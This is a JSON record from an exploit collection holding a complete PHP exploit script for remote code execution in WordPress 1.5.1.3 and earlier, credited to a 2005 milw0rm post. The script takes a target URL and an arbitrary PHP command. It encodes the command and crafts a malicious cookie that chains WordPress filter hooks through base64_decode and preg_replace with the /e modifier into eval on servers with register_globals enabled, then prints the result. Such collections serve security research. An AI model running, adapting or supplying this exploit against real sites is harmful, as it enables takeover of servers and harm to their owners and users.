{
  "id": "1142",
  "title": "WordPress Core 1.5.1.3 - Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "<?php\r\n    echo \"Wordpress <= 1.5.1.3 - remote code execution 0-DDAAYY exploit\\n\";\r\n    echo \"(C) Copyright 2005 Kartoffelguru\\n\\n\";\r\n    echo \"[!] info: requires register_globals turned on on target host\\n\\n\";\r\n    if (!extension_loaded('curl')) {\r\n        die (\"[-] you need the curl extension activated...\\n\");\r\n    }\r\n\r\n    function usage()\r\n    {\r\n        die (\"usage:\\n\\t./wpx.php -h http://www.xyz.net/blog/ -c 'system(\\\"uname -a;id\\\");'\\n\\n\");\r\n    }\r\n\r\n    $options = getopt(\"h:c:\");\r\n    if (count($options) < 1 || !isset($options['h'])) {\r\n        usage();\r\n    }\r\n\r\n    $host = (is_array($options['h']) ? $options['h'][0]:$options['h']);\r\n    $cmd  = (is_array($options['c']) ? $options['c'][0]:$options['c']);\r\n\r\n    if (!preg_match(\"/^http:\\/\\//\", $host, $dummy)) {\r\n        usage();\r\n    }\r\n\r\n    if (strlen(trim($cmd))==0) {\r\n        $cmd = 'phpinfo();';\r\n    }\r\n\r\n    $code = base64_encode($cmd);\r\n    $cnv = \"\";\r\n    for ($i=0;$i<strlen($code); $i++) {\r\n        $cnv.= \"chr(\".ord($code[$i]).\").\";\r\n    }\r\n    $cnv.=\"chr(32)\";\r\n\r\n    $str = base64_encode('args[0]=eval(base64_decode('.$cnv.')).die()&args[1]=x');\r\n\r\n    $cookie='wp_filter[query_vars][0][0][function]=get_lastpostdate;wp_filter[query_vars][0][0][accepted_args]=0;';\r\n    $cookie.='wp_filter[query_vars][0][1][function]=base64_decode;wp_filter[query_vars][0][1][accepted_args]=1;';\r\n    $cookie.='cache_lastpostmodified[server]=//e;cache_lastpostdate[server]=';\r\n    $cookie.=$str;\r\n    $cookie.=';wp_filter[query_vars][1][0][function]=parse_str;wp_filter[query_vars][1][0][accepted_args]=1;';\r\n    $cookie.='wp_filter[query_vars][2][0][function]=get_lastpostmodified;wp_filter[query_vars][2][0][accepted_args]=0;';\r\n    $cookie.='wp_filter[query_vars][3][0][function]=preg_replace;wp_filter[query_vars][3][0][accepted_args]=3;';\r\n\r\n    $ch = curl_init();\r\n    curl_setopt($ch, CURLOPT_URL, $host);\r\n    curl_setopt($ch, CURLOPT_POST, 0);\r\n    curl_setopt($ch, CURLOPT_COOKIE, $cookie);\r\n    curl_setopt($ch, CURLOPT_HEADER, 0);\r\n    curl_setopt($ch, CURLOPT_CURLOPT_REFERER, $host);\r\n    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\n    curl_setopt($ch, CURLOPT_USERAGENT, \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)\");\r\n    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);\r\n    echo \"[+] now executing\\n\\n\";\r\n\r\n    $r = curl_exec($ch);\r\n    curl_close($ch);\r\n\r\n    echo $r;\r\n\r\n?>\r\n\r\n// milw0rm.com [2005-08-09]",
  "url": "https://www.exploit-db.com/exploits/1142"
}